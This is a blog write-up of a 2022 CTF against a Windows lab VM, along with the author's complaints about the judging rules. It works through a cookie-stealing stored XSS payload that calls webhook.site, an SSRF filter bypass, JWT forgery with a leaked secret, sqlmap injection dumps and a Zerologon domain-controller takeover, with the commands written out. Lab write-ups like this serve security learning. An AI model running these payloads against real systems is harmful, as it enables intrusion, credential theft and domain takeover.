+++
title = "🥶 NUWE Schneider Electric 2022 CTF"
description = "Writeup for their challenge"
date = "2022-05-21"
aliases = ["writeup", "writeups", "ctf", "ctfs"]
author = "cakehonolulu"
+++
<br>

<table>
<thead>
  <tr>
<th>Difficulty</th>
<td>Medium</td>
  </tr>
</thead>
<tbody>
  <tr>
<th>Category</th>
<td>Multiple (Web Exploitation, OSINT, Windows Exploitation...)</td>
  </tr>
</tbody>
</table>

# DISCLAIMER!
<br>

My team and I decided against presenting a solution for this challenge due to the unfair rules and unprecedented incompetence by the organization.

A CTF is an event where the team with most flags wins; regardless of the way found (Minus bruteforcing them...).

Finding the flags in plaintext is a sign of neglection by the organizers; us "exploiting" their negligence *IS* a way of winning their CTF.

You can't change the rules, one method isn't better than any other.

A FLAG is a FLAG; get pwned.

# 1.- The "UNINTENDED" way
<br>
You're presented with a .ZIP file containing a VirtualBox .ova file password-protected; the password was given to us right after the initial ceremony.

Password: <code>vb8thy2feJyy6r7HTcq8e5qLHGj7ezuWrF4uEE66</code>

An <code>ova</code> file is nothing more than a <code>tarball</code> containing VirtualBox VM-related files (Machine
configuration schema, SHA's...); plus a virtual disk image (<code>vmdk</code>).

As such, one can freely mount the image and look for things.

Challenge creators seemed to evaluate the method you used to obtain the flag with a "ready-reckoner" they didn't publish.

First, I disclosed them the method I used to find the flags; the person I disclosed this to, told me that this wasn't the way that they intended it for us to solve it
(So, it was *definitely* unintentional) but that it was as valid as any other solution! (He also told me to try finding more ways, which IMHO is a good thing to do too; 
I have 0 criticism against him, he was the most supportive of all; curiously he was from NUWE and not from Schneider...).

After this convo, I found the rest of the local flags (All of them), so I told another mentor in Cybersecurity that I found them.

After 10 minutes or so, we had a team from Schneider get into our call to discuss our findings.

Here's where the fun started.

The mental gymnastics they were doing in order to disqualify the findings was abismal.

Their main points were:

<code>You found the flags, good; but the method isn't the intended one.</code>

Yes, and? Part of the fun from CTFs comes from finding multiple ways of defeating a challenge; be it running a strings() on a file or creating a super-complicated script that mangles the flags for you.



A few weeks ago I was @ UPC's Hackathon doing CTF challenges and the challenge authors approached me to discuss the unintended ways I used and we got a super nice convo discussing a lot of CTF-related topics.



After all, CTFs are defined like that because once you find the flag, you upload it in exchange of points or whatever they decide.


If you need to upload an explanation on how you found them, it's not a CTF.


CTFs aren't dictaminated by judges.


CTFs are dictaminated by your skills on developing ways to find a hidden code behind a web, a binary or whatever you want.


Flags are immutable, it doesn't matter if you ROP your way into a remote shell or if you use an unintended format string vuln.


This is the first time in my entire life that I participate in a Hackathon that promotes a CTF but isn't a CTF in reality.


<code>Yeah, but flags only count 30% and writeups 70%</code>


While I agree that as an organizer you have the rights to create a custom set of rules for the challenge, you can't introduce/modify/delete (sub)rules
at your will as soon as you find a thing that doesn't fall inside your rules.


I was on different calls during the event and even some of the mentors were uninformed that this wasn't "legal" per se.


I unfortunately don't have screen recordings/audio proofs; but it was a shitshow, they couldn't even agree in a solution to the problem.

Also, 70% writeups and 30% flags?



TF is that?


This only adds subjectiveness into the judgement of a CTF.


Read the last 3 phrases again, the more you read them, the less sense they make.


This is a Judged CTF with subjective rules

![WTF](/images/ctfs/schneidelec/wtf.jpeg)

What will you judge from a writeup?

Not using Comic Sans????

lmao

There were more "arguments" (If they can be called like so), I won't get into discussing them, each one they threw was worse than the previous one.

{{< highlight bash >}}
$ grep -FR "FLAG{" --exclude-dir "Windows" --exclude-dir "Program Files" --exclude-dir "Program Files (x86)" 2>/dev/null
FLAG{sanitize_input}
FLAG{Mas_uno_por_revisar_sistema}
FLAG{Buen_Password_Spraying_Eh?}
FLAG{A_su_servicio}
FLAG{Pesadilla_en_el_trabajo}
FLAG{Ay_Ay_Vigila_Tu_Puesto}
API_FLAG{Never_public_your_secret}
FLAG{SSRF_PARA_TOD@S_XD}
{{< /highlight >}}

Next one was found by searching: "Default MySQL Windows Database Location" in DuckDuck :)

{{< highlight bash >}}
$ strings "ProgramData/MySQL/MySQL Server 8.0/Data/flag/flag.ibd"
FLAG{Update_Plugins!}
{{< /highlight >}}


{{< highlight bash >}}
$ find . -name "*.sql*" | xargs strings | grep -F "FLAG{"
FLAG{Sticky_Notes_FTW}
{{< /highlight >}}

In: ./Users/jenriques/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite-wal

{{< highlight bash >}}
$ grep -R "Instagram" Users/Public/
{{< /highlight >}}

We find an Instagram link, check the second photo:

![Instagram](/images/ctfs/schneidelec/instagram.jpeg)


<code>FLAG{El_Buen_OSINT_Naito}</code>


Fuck your shitty invented rules, don't pretend you've made a blackbox-style CTF. The moment you give us a machine to test our things one, it's not a blackbox anymore.

HackUPC hosted almost a 1000 members and their network was made by them.

They were university students and could do it.

You are a business and can't even host a exploitable CTF machine on your own.

Whatever...

# Let's pwn the shit out of your machine then
<br>

![EZ](/images/ctfs/schneidelec/ez.jpg)

<br>
<br>
<br>
<br>
<br>

# 2.- The(ir) INTENDED way
<br>
<p>
<code>Flags: 2 OSINT + 4 WEB + 3 SYSTEM ( + 3 BONUS)</code>


You're presented with a .ZIP file containing a VirtualBox .ova file password-protected; the password was given to us right after the initial ceremony.

Password: <code>vb8thy2feJyy6r7HTcq8e5qLHGj7ezuWrF4uEE66</code>

<strike>An <code>ova</code> file is nothing more than a <code>tarball</code> containing VirtualBox VM-related files (Machine
configuration schema, SHA's...); plus a virtual disk image (<code>vmdk</code>).

As such, one can freely mount the image and look for things.</strike>

Let's open the ova file; it'll automagically set up a VirtualBox machine for us, don't forget to change the network properties! (Generate random MAC addr's and set the internet method to bridged).

![RNG_MAC](/images/ctfs/schneidelec/rng_mac.gif)


We may as well power the machine on right after, right?

We're greeted with a...

![Windows?](/images/ctfs/schneidelec/cursed_win.png)


Windows machine? More like  W̰̟ͨ̍͡i̦͉͎ͧ́n̷̲̹̓ͬd̰̜̖̦ͯ͗ͫ͡ǫ̰̬͓͑ẇ̦͎͖̺̺̗̎̂͜s̓҉̺̰̰ ̮̣́̚͟Mͯ͂̑͗͏̰̠̝̮̭͖̝a̫͚͙ͫͫͩ̀c̡̦̲̻̪̹̩̪ͪ̌̆ͮh̙͔̠̱͎̯͊̀̕ì̳̲͖̼͝ň͚̝̺͇̣̋͠e͋

Anyway, the next thing to do is find where the machine resides in our local network.


There's multiple ways of doing so, I personally went with the <code>arp-scan</code> way.

{{< highlight bash >}}
$ sudo arp-scan --local
Interface:
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.1.145		PCS Systemtechnik GmbH<br>
...
1 packet received by filter, 0 packets dropped by kernel<br>
Ending arp-scan 1.9.7: 256 hosts scanned in 1.943 seconds (131.76 hosts/sec). 1 responded<br></code>
{{< /highlight >}}


Aha, we got it.


If this was a true blackbox style challenge; we'd need to discover the target's operating system.

There are a lot of ways, what I tend to do is check ping's <code>ttl</code> value to find <i>a grosso modo</i> which OS we're dealing with.

{{< highlight bash >}}
$ ping 192.168.1.145
PING 192.168.1.145 (192.168.1.145) 56(84) bytes of data.
64 bytes from 192.168.1.145: icmp_seq=1 ttl=128 time=0.243 ms
{{< /highlight >}}


TTL=128, so we'd know that we'd probably be dealing with a Windows machine if we had no information relating to the machine (TTL=128, Windows; TTL=64, Linux).

While it's not a general rule, it tends to apply to CTF challenges, so there you have it just in case.


We're presented with a Windows login on the machine, but we have no credential information so it's a dead-end for now.


Let's now run a port scan targetting the machine.

{{< highlight bash >}}
$ nmap -Pn -p- 192.168.1.145
{{< /highlight >}}

There were a lot of results so I'll filter out the interesting ones


{{< highlight bash >}}
80/tcpopen  http
443/tcp   open  https
1337/tcp  open  waste
5000/tcp  open  upnp
Nmap done: 1 IP address (1 host up) scanned in 128.55 seconds
{{< /highlight >}}

Remember:

<code>-Pn</code> makes nmap only do port scan

<code>-p-</code> specifies all range of ports [0, UINT16_MAX]

There were WinRM, Kerberos, MySQL and LDAP ports opened too; I took note of them just in case (They can be attack vectors too).


We'll focus now on web exploitation, so let's attach http(s) ones first.


Let's try opening the HTTP port first on a web browser.



We're greeted with this:

![Port80](/images/ctfs/schneidelec/80.png)


Not that much happening right here...


Let's get to the next one (443, HTTPs):


It... loads forever?

Looks like it's not responding at all or it's missing something; let's jump to the next one (1337):

{{< highlight html >}}
Bad Request - Invalid Hostname
HTTP Error 400. The request hostname is invalid
{{< /highlight >}}


It looks like we don't have access...


Let's jump to the last one (5000):


Aha! Looks like we have something!


The page returns us a <code>application/json</code> content:

{{< highlight json >}}
{"text":  "There is nothing to see here (I guess)"}
{{< /highlight >}}

Yeah, that's suspicious.


Let's go back to the first webpage we got in.


We'll run a directory fuzzing scan against it, you can use any of the available tools you want; I used <code style="font-size:15.5px">ffuf</code>

{{< highlight bash >}}
$ ffuf -c -w secret_list.txt -u http://192.168.1.145/FUZZ -e .htm,.html,.txt,.css,.js,.php
 /'___\  /'___\   /'___\   
/\ \__/ /\ \__/  __  __  /\ \__/   
\ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\  
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/  
  \ \_\   \ \_\  \ \____/  \ \_\   
   \/_/\/_/   \/___/\/_/

v1.5.0-dev
________________________________________________

:: Method   : GET
:: URL  : http://192.168.1.145/FUZZ
:: Wordlist : FUZZ: secret_list.txt
:: Extensions   : .htm .html .txt .css .js .php
:: Follow redirects : false
:: Calibration  : false
:: Timeout  : 10
:: Threads  : 40
:: Matcher  : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

index.php   [Status: 200, Size: 1357, Words: 111, Lines: 37, Duration: 4ms]
comments.txt[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2ms]
robots.txt  [Status: 200, Size: 24, Words: 2, Lines: 1, Duration: 24ms]
testsite.php[Status: 200, Size: 267, Words: 9, Lines: 17, Duration: 4ms]
{{< /highlight >}}

Cool, ffuf found a bunch of interesting stuff.


Let's access index.php

![Index80](/images/ctfs/schneidelec/index_80.png)


Meh, it doesn't look interesting


It's vulnerable to XSS, so there goes that.

![XSS](/images/ctfs/schneidelec/xss.png)


May I add that this applet is beyond broken? While fuzzing the textbox, at some point the website just, either crashed or did something wrong.


Later, I saw that it writes the textbox contents to a file named comments.txt and reads it each time we enter to the page, effectively rendering most of our strategies to a one-time-only test before everything get's f*d up.


So you have to re-install the VM each time you plan an XSS strategy else it gets filled with all the previous stuff you fuzzed it with.


It looks intentional (And very unsafe too).


Basically this looks like a very powerful form of XSS called <a href="https://portswigger.net/web-security/cross-site-scripting/stored">Stored XSS</a>, everyone who visits this link will get the XSS payload delivered... This is not good for the end user
but it's good for us :)


Let's craft an XSS payload that delivers the cookies to an endpoint (I used this exact method in HackTheBox's Cyber Apocalypse Web Kryptos Support Challenge, it's identical), webhook.site in this case


The payload I used is:

{{< highlight javascript >}}
<script>var xmlHttp = new XMLHttpRequest(); xmlHttp.open('GET', 'https://webhook.site/Random_UUID/ENDPOINT?variable='+document.cookie, false ); xmlHttp.send(null)</script>
{{< /highlight >}}

Let's wait a bit and...

![SanitizeInput](/images/ctfs/schneidelec/sanitize_input.png)


Bingo: <code>FLAG{sanitize_input}</code>


Let's jump to our next target; testsite.php

![TestSite](/images/ctfs/schneidelec/testsite.png)


Interesting... let's try to redirect ourselves somewhere... maybe localhost:1337 ?


The website redirects you if you input your tests, let's try using <code>curl</code>


I inspected the request using Firefox's Network Page in it's built in Inspector, and the textbox contents get appended to an HTTP Request variable named <code>url</code> accordingly, so let's start doing some requests, shall we?


{{< highlight bash >}}
$ curl "http://192.168.1.145/testsite.php?url=localhost" -w "\n"
{{< /highlight >}}


It returns us "Protocolo no permitido" (Prohibited protocol), we haven't *really* specified a protocol, let's try maybe... http?

{{< highlight bash >}}
$ curl "http://192.168.1.145/testsite.php?url=http://localhost" -w "\n"
{{< /highlight >}}

Now it outputs:

<code>La ruta localhost no esta permitida por razones de seguridad. Que intentas hacer? :D</code>

It's telling us roughly that the localhost location can't be accessed for security reasons... is this some sort of anti-SSRF methodology?

{{< highlight bash >}}
$ curl "http://192.168.1.145/testsite.php?url=http://127.0.0.1" -w "\n"
{{< /highlight >}}

This doesn't work, let's try bypassing a possible anti-SSRF protocol...

{{< highlight bash >}}
$ curl "http://192.168.1.145/testsite.php?url=http://localhosT" -w "\n"
{{< /highlight >}}

This redirects us to localhost, so the anti-SSRF rule looks bypassed... Maybe let's try adding the ports we wrote down earlier?

{{< highlight bash >}}
$ curl "http://192.168.1.145/testsite.php?url=http://localhosT:443" -w "\n"
{{< /highlight >}}


Nothing

{{< highlight bash >}}
$ curl "http://192.168.1.145/testsite.php?url=http://localhosT:1337" -w "\n"
{{< /highlight >}}


Bingo: <code>FLAG{SSRF_PARA_TOD@S_XD}</code>


Let's continue with the pwnage.


Remember the robots.txt file? Well, here are the contents:

{{< highlight bash >}}
# https://wp.geohome.com
{{< /highlight >}}


Let's add that to our hosts file and enter the website

![GeoSite](/images/ctfs/schneidelec/geosite.png)


Good, let's find something in here of our interest.


We find a <a href="https://github.com/geohome-dev/">GitHub profile link</a> at the bottom of the page alongside a facebook one.


Let's try looking for the GitHub one... interesting, only 1 repo... let's access it:

Maybe enter the commits section?

![Commits](/images/ctfs/schneidelec/commits.png)


Bingo: <code>FLAG{ALWAYS_CHECK_COMMITS}</code>

![ButWaitTheresMore](/images/ctfs/schneidelec/bwtm.jpg)

![JWT](/images/ctfs/schneidelec/jwt.png)


We now have one more flag and a *secret* JSON Web Token <code>Ge0HomeIsThePlaceWhereFantasyMeetsReality</code> :) 


JSON... sounds familiar... Remember when we accessed the server's port 5000? It returns JSON data.


Maybe something we can fuzz now that we have a JWT?


Let's try the default endpoints for an API (/admin, /logout, /login, /register...)


{{< highlight bash >}}
$ curl "http://192.168.1.145:5000/admin"
{{< /highlight >}}


Returns:

{{< highlight json >}}
{"msg": "Missing Authorization Header"}
{{< /highlight >}}

nothing to see here... for now...

Remember the GitHub's README?

![API](/images/ctfs/schneidelec/api.png)


This comes handy...

{{< highlight bash >}}
$ curl "http://192.168.1.145:5000/register" --header "Content-Type: application/json" --data-raw '{"username": "challenge_rules_suck", "password": "suck_a_lot"}'
{{< /highlight >}}


Returns:

{{< highlight json >}}
{"Message": "Username has been created! Now you can successfully login."}
{{< /highlight >}}

so... let's login?

{{< highlight bash >}}
$ curl "http://192.168.1.145:5000/login" --header "Content-Type: application/json" --data-raw '{"username": "challenge_rules_suck", "password": "suck_a_lot"}'
{{< /highlight >}}


Returns:


{{< highlight json >}}
{"access_token":  "very_large_jwt_token"}
{{< /highlight >}}


hmm...


Maybe...


{{< highlight bash >}}
$ curl "http://192.168.1.145:5000/logout"
{{< /highlight >}}


404... I guess we're stuck w/ the challenge_rules_suck account forever ;)

Let's head over to <a href="https://jwt.io/">jwt.io</a> to inspect the token.

![VJWT](/images/ctfs/schneidelec/vjwt.png)

Let's change the "sub" key w/ "admin"; input their leaked JWT secret and use the resulting token to log in.


![CJWT](/images/ctfs/schneidelec/cjwt.png)

{{< highlight bash >}}
$ curl "http://192.168.1.145:5000/admin" --header "Authorization: Bearer that_long_token_we_just_got"
{{< /highlight >}}


Returns:

{{< highlight json >}}
{"Flag":  "API_FLAG{Never_public_your_secret}", "Message":"Oh hello again dear Administrator"}
{{< /highlight >}}

Bingo: <code>API_FLAG{Never_public_your_secret}</code>


Alright, let's continue; <code>Wappalyzer</code> browser extension lists a website's building blocks; and it lists WordPress...


One thing I learned from various CTFs is that WordPress is (If not done right) one of the most vulnerable-prone frameworks that exist, it having plugins makes it even more of a sticky-icky situation.


Thanks to this (Curiously) <a href="https://apageinsec.wordpress.com/2019/04/03/raven-1-walkthrough/">WordPress blog entry</a> I found out that there's a tool called WPScan that is able to
perform blackbox auditing on a remote WordPress website; so, what I did next is; install the tool and run a quick scan targetting the machine:


{{< highlight bash >}}
$ wpscan --url https://wp.geohome.com/
{{< /highlight >}}


Strange... :

{{< highlight bash >}}
Scan Aborted: The url supplied 'https://wp.geohome.com/' seems to be down (SSL peer certificate or SSH remote key was not OK)
{{< /highlight >}}

The URL is definitely up, as I'm able to enter it without problems, but I remember facing a warning on Firefox the first time I accessed it:

{{< highlight bash >}}
wp.geohome.com uses an invalid security certificate.<br>

The certificate is not trusted because it is self-signed.<br>

Error code: MOZILLA_PKIX_ERROR_SELF_SIGNED_CERT<br>
{{< /highlight >}}


Maybe this is related? I jumped on DuckDuck and found <a href="https://github.com/wpscanteam/wpscan/issues/1380#issuecomment-525762380">a GitHub link</a> with a possible workaround, so I went ahead and tried it:

{{< highlight bash >}}
$ wpscan --url https://wp.geohome.com/ --disable-tls-checks
{{< /highlight >}}

<details>
<summary>WPScan Output:</summary>
{{< highlight bash >}}
_______________________________________________________________
__          _______   _____
\ \        / /  __ \ / ____|
 \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
  \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
   \  /\  /  | |     ____) | (__| (_| | | | |
    \/  \/   |_|    |_____/ \___|\__,_|_| |_|

WordPress Security Scanner by the WPScan Team
Version 3.8.22
  Sponsored by Automattic - https://automattic.com/
  @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://wp.geohome.com/ [192.168.1.145]
[+] Started: Sun May 22 21:37:08 2022

Interesting Finding(s):

[+] Headers
| Interesting Entries:
|  - server: Microsoft-IIS/10.0
|  - x-powered-by: PHP/8.0.0
| Found By: Headers (Passive Detection)
| Confidence: 100%

[+] robots.txt found: https://wp.geohome.com/robots.txt
| Interesting Entries:
|  - /wp-admin/
|  - /wp-admin/admin-ajax.php
| Found By: Robots Txt (Aggressive Detection)
| Confidence: 100%

[+] XML-RPC seems to be enabled: https://wp.geohome.com/xmlrpc.php
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%
| References:
|  - http://codex.wordpress.org/XML-RPC_Pingback_API
|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
|  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: https://wp.geohome.com/readme.html
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://wp.geohome.com/wp-cron.php
| Found By: Direct Access (Aggressive Detection)
| Confidence: 60%
| References:
|  - https://www.iplocation.net/defend-wordpress-from-ddos
|  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.9.3 identified (Latest, released on 2022-04-05).
| Found By: Rss Generator (Passive Detection)
|  - https://wp.geohome.com/feed/, <generator>https://wordpress.org/?v=5.9.3</generator>
|  - https://wp.geohome.com/comments/feed/, <generator>https://wordpress.org/?v=5.9.3</generator>

[+] WordPress theme in use: twentytwentytwo
| Location: https://wp.geohome.com/wp-content/themes/twentytwentytwo/
| Latest Version: 1.1 (up to date)
| Last Updated: 2022-02-25T00:00:00.000Z
| Readme: https://wp.geohome.com/wp-content/themes/twentytwentytwo/readme.txt
| Style URL: https://wp.geohome.com/wp-content/themes/twentytwentytwo/style.css?ver=1.1
| Style Name: Twenty Twenty-Two
| Style URI: https://wordpress.org/themes/twentytwentytwo/
| Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...
| Author: the WordPress team
| Author URI: https://wordpress.org/
|
| Found By: Css Style In Homepage (Passive Detection)
| Confirmed By: Css Style In 404 Page (Passive Detection)
|
| Version: 1.1 (80% confidence)
| Found By: Style (Passive Detection)
|  - https://wp.geohome.com/wp-content/themes/twentytwentytwo/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] bdthemes-element-pack-lite
| Location: https://wp.geohome.com/wp-content/plugins/bdthemes-element-pack-lite/
| Last Updated: 2022-05-21T12:23:00.000Z
| [!] The version is out of date, the latest version is 4.2.1
|
| Found By: Urls In Homepage (Passive Detection)
| Confirmed By: Urls In 404 Page (Passive Detection)
|
| Version: 4.1.0 (80% confidence)
| Found By: Readme - Stable Tag (Aggressive Detection)
|  - https://wp.geohome.com/wp-content/plugins/bdthemes-element-pack-lite/readme.txt

[+] elementor
| Location: https://wp.geohome.com/wp-content/plugins/elementor/
| Latest Version: 3.6.5 (up to date)
| Last Updated: 2022-04-27T13:20:00.000Z
|
| Found By: Urls In Homepage (Passive Detection)
|
| Version: 3.6.5 (100% confidence)
| Found By: Query Parameter (Passive Detection)
|  - https://wp.geohome.com/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.6.5
| Confirmed By:
|  Readme - Stable Tag (Aggressive Detection)
|   - https://wp.geohome.com/wp-content/plugins/elementor/readme.txt
|  Javascript Comment (Aggressive Detection)
|   - https://wp.geohome.com/wp-content/plugins/elementor/assets/js/admin-feedback.js, Match: 'elementor - v3.6.5'

[+] perfect-survey
| Location: https://wp.geohome.com/wp-content/plugins/perfect-survey/
| Latest Version: 1.5.1 (up to date)
| Last Updated: 2021-06-11T12:09:00.000Z
|
| Found By: Urls In Homepage (Passive Detection)
| Confirmed By: Urls In 404 Page (Passive Detection)
|
| Version: 1.5.1 (80% confidence)
| Found By: Readme - Stable Tag (Aggressive Detection)
|  - https://wp.geohome.com/wp-content/plugins/perfect-survey/readme.txt

[+] pro-elements
| Location: https://wp.geohome.com/wp-content/plugins/pro-elements/
|
| Found By: Urls In Homepage (Passive Detection)
|
| The version could not be determined.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
Checking Config Backups - Time: 00:00:31 <===============================================================================================================> (137 / 137) 100.00% Time: 00:00:31

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun May 22 21:37:44 2022
[+] Requests Done: 159
[+] Cached Requests: 30
[+] Data Sent: 47.619 KB
[+] Data Received: 569.914 KB
[+] Memory used: 234.621 MB
[+] Elapsed time: 00:00:36
{{< /highlight >}}
</details>


We could try looking for Vulns in each out-to-date plugin, let's do that:


<code>bdthemes-element-pack-lite</code> looks outdated, but there are no known vulns so we don't have much left to check.


Let's try with updated plugins:


<code>elementor</code>? Nope, <code>perfect-survey</code>?


![Exploit](/images/ctfs/schneidelec/exploit.png)



<a href="https://www.exploit-db.com/exploits/50766">Bingo!</a>


So the provided exploit-db's exploit uses <code>sqlmap</code> to exploit the vulnerability


Let's use that:


In the same fashion as HackUPC challenges, I needed to open BURP and specify the --proxy option to sqlmap in order for exploit-db's command to work:


Fun fact: The machine BSOD while I was running SQLMap :D

{{< highlight bash >}}
$ sqlmap -u "https://wp.geohome.com/wp-admin/admin-ajax.php?action=get_question&question_id=1 *" --proxy="127.0.0.1:8080"
{{< /highlight >}}

<details>
<summary>SQLMap Output:</summary>>
{{< highlight bash >}}
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.6#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:25:05 /2022-05-22/

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
[15:25:07] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('wp-ps-session=ckshrftg341...9l2980fo6c'). Do you want to use those [Y/n] Y
[15:25:09] [INFO] testing if the target URL content is stable
[15:25:10] [INFO] target URL content is stable
[15:25:10] [INFO] testing if URI parameter '#1*' is dynamic
[15:25:10] [WARNING] URI parameter '#1*' does not appear to be dynamic
[15:25:10] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[15:25:10] [INFO] testing for SQL injection on URI parameter '#1*'
[15:25:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[15:25:11] [WARNING] reflective value(s) found and filtering out
[15:25:12] [INFO] URI parameter '#1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
[15:25:13] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] n
[15:25:19] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[15:25:19] [INFO] testing 'Generic inline queries'
[15:25:20] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[15:25:20] [WARNING] time-based comparison requires larger statistical model, please wait.............. (done)   
[15:25:34] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[15:25:34] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[15:25:34] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[15:25:35] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[15:25:36] [INFO] target URL appears to have 16 columns in query
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] n
[15:26:09] [WARNING] if UNION based SQL injection is not detected, please consider usage of option '--union-char' (e.g. '--union-char=1') and/or try to force the back-end DBMS (e.g. '--dbms=mysql') 
[15:26:14] [INFO] target URL appears to be UNION injectable with 16 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] n
[15:26:40] [INFO] checking if the injection point on URI parameter '#1*' is a false positive
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 193 HTTP(s) requests:
---
Parameter: #1* (URI)
Type: boolean-based blind
Title: AND boolean-based blind - WHERE or HAVING clause
Payload: https://wp.geohome.com:443/wp-admin/admin-ajax.php?action=get_question&question_id=1  AND 4443=4443

Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: https://wp.geohome.com:443/wp-admin/admin-ajax.php?action=get_question&question_id=1  AND (SELECT 2743 FROM (SELECT(SLEEP(5)))iLzk)
---
[15:26:45] [INFO] the back-end DBMS is MySQL
web server operating system: Windows 2019 or 10 or 2016
web application technology: PHP 8.0.0, Microsoft IIS 10.0
back-end DBMS: MySQL >= 5.0.12
[15:26:47] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 46 times, 500 (Internal Server Error) - 4 times
[15:26:47] [INFO] fetched data logged to text files under '/home/cakehonolulu/.local/share/sqlmap/output/wp.geohome.com'

[*] ending @ 15:26:47 /2022-05-22/
{{< /highlight >}}
</details>


We can see that it's both vulnerable to a boolean and a time-based SQLi; let's exploit that:

{{< highlight bash >}}
$ sqlmap -u "https://wp.geohome.com/wp-admin/admin-ajax.php?action=get_question&question_id=1 *" --dump-all
{{< /highlight >}}

We wait for a bit and we can see that there's a table named 'flag'

{{< highlight bash >}}
fetching tables for databases: 'flag, information_schema, wordpress'
{{< /highlight >}}


Let's dump that one:

{{< highlight bash >}}
$ sqlmap -u "https://wp.geohome.com/wp-admin/admin-ajax.php?action=get_question&question_id=1 *" --dump --code=200 --dbms=MySQL -D flag
{{< /highlight >}}

{{< highlight sql >}}
Database: flag
Table: flag
[1 entry]
+-----------------------+
| flag                  |
+-----------------------+
| FLAG{Update_Plugins!} |
+-----------------------+
{{< /highlight >}}

Bingo: <code>FLAG{Update_Plugins!}</code>

# Windows Exploitation

<br>
Now we'll jump straight to Windows exploiting; while I was discussing the CTF with a NUWE employer, I told them that I found
LDAP Ports opened on the machine (Along SMB, RPC...) so those were interesting targets for me just as I saw them, but decided
against starting w/ those due to finding web exploiting generally easier.


So what I did next is trying to find information regarding the Active Directory running in the machine, for that, I used CrackMapExec.

{{< highlight bash >}}
$ cme smb 192.168.1.145
{{< /highlight >}}


This returned:

{{< highlight bash >}}
SMB 192.168.1.145   445GEOHOME-DC   [*] Windows 10.0 Build 17763 x64 (name:GEOHOME-DC) (domain:geohome.com) (signing:True) (SMBv1:False)
{{< /highlight >}}

We now have a domain controller name.


According to Wikipedia, Build 17763 was launched in Q4 2018; so it's a little bit old... Let's start to look for Active Directory vulns on cvedetails that match our findings.


While it's true that you could go ahead and try a vast list of vulns; I went the zerologon way (CVE-2020-1472); HackTheBox's Multimaster Machine was exploited the same way so why not reuse those concepts.

{{< highlight bash >}}
$ git clone https://github.com/zeronetworks/zerologon && cd zerologon/
{{< /highlight >}}


Let's run the tester script with our newly found Domain Controller Name:

{{< highlight bash >}}
$ python zerologon.py GEOHOME-DC 192.168.1.145
{{< /highlight >}}

Which yields:

{{< highlight bash >}}
Performing authentication attempts...
=========================================================================================================
Success! DC can be fully compromised by a Zerologon attack.
{{< /highlight >}}

Nice


Let's pwn it then.

{{< highlight bash >}}
$ git clone https://github.com/dirkjanm/CVE-2020-1472 && cd CVE-2020-1472/
{{< /highlight >}}


{{< highlight bash >}}
$ python cve-2020-1472-exploit.py GEOHOME-DC 192.168.1.145
{{< /highlight >}}


{{< highlight bash >}}
Performing authentication attempts...
================================================================================================================================================================================================================================================================================================================================================================================================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!
{{< /highlight >}}

:)

Let's try to log in using WinRM and the PTH technique, but first; we need a hash, let's obtain them.

{{< highlight bash >}}
$ secretsdump.py -no-pass -just-dc GEOHOME-DC\$@192.168.1.145
{{< /highlight >}}


